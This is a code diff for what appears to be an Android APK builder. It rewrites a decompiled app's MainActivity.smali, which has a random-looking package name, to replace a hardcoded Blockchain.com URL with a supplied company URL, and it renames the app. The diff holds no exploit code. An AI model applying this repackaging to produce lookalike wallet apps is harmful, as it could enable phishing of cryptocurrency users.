@@ -111,6 +111,26 @@ export async function buildAPKEnhanced(options: APKBuildOptions): Promise<{
       console.log('[APK] Logo URL provided but using default icon for now');
     }
     
+    // ===== MODIFY SMALI TO READ URL FROM CONFIG =====
+    try {
+      const mainActivityPath = path.join(decompileDir, 'smali/com/comp/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/MainActivity.smali');
+      if (fs.existsSync(mainActivityPath)) {
+        let smali = fs.readFileSync(mainActivityPath, 'utf-8');
+        
+        // Replace hardcoded Blockchain URL with config reading code
+        // This is a simplified approach - we'll inject code to read from config file
+        smali = smali.replace(
+          /const-string v0, "https:\/\/www\.blockchain\.com"/g,
+          `const-string v0, "${options.companyUrl}"`
+        );
+        
+        fs.writeFileSync(mainActivityPath, smali);
+        console.log('[APK] MainActivity.smali updated with custom URL');
+      }
+    } catch (e) {
+      console.warn('[APK] Warning: Could not modify MainActivity.smali:', e);
+    }
+    
     // ===== MODIFY MANIFEST FOR NAME =====
     const manifestPath = path.join(decompileDir, 'AndroidManifest.xml');
     if (fs.existsSync(manifestPath)) {
